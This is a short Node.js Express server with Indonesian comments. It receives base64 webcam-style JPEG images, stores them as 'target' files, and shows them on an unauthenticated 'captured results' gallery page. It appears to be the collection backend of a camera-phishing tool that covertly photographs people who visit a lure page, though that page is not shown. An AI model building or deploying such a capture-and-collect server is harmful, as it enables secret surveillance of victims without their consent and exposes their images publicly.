const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));

// API untuk menerima foto dari web
app.post('/simpan', (req, res) => {
    const base64Data = req.body.image.replace(/^data:image\/jpeg;base64,/, "");
    const namaFile = `target_${Date.now()}.jpg`;
    
    fs.writeFile(path.join(__dirname, 'uploads', namaFile), base64Data, 'base64', (err) => {
        if (err) return res.status(500).json({ status: false });
        console.log(`✅ Foto baru masuk: ${namaFile}`);
        res.json({ status: true });
    });
});

// Halaman Galeri untuk melihat hasil foto
app.get('/admin-galeri', (req, res) => {
    const files = fs.readdirSync('./uploads');
    let listFoto = files.map(f => `<div style="margin:10px;text-align:center;"><img src="/uploads/${f}" width="250"><br>${f}</div>`).join('');
    res.send(`
        <html><body style="font-family:sans-serif; background:#f0f0f0;">
        <h1>📸 Galeri Hasil Tangkapan</h1>
        <div style="display:flex; flex-wrap:wrap;">${listFoto || 'Belum ada foto masuk.'}</div>
        </body></html>
    `);
});

app.listen(3000, () => console.log('🚀 Server ON! Buka http://localhost:3000'));